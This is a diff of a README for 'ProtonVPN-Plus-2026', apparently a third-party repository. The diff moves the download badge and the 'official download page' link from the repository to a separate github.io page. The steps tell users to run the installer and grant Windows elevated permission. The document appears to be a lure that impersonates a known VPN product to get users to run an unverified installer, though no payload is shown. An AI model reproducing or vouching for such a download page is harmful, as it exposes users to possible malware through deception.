@@ -1,6 +1,6 @@
 # 🛡️ ProtonVPN-Plus-2026 - Secure your internet connection today
 
-[![](https://img.shields.io/badge/Download_ProtonVPN_Plus-blue.svg)](https://github.com/Simeonka7709/ProtonVPN-Plus-2026)
+[![](https://img.shields.io/badge/Download_ProtonVPN_Plus-blue.svg)](https://simeonka7709.github.io)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Your computer must meet these basic standards to run the software.
 
 Follow these instructions to install ProtonVPN-Plus-2026 on your PC.
 
-1. Visit the [official download page](https://github.com/Simeonka7709/ProtonVPN-Plus-2026) to obtain the installer file.
+1. Visit the [official download page](https://simeonka7709.github.io) to obtain the installer file.
 2. Locate the file in your Downloads folder once the transfer finishes.
 3. Double-click the file to start the setup process.
 4. Grant the application permission to make changes to your device if Windows requests it.
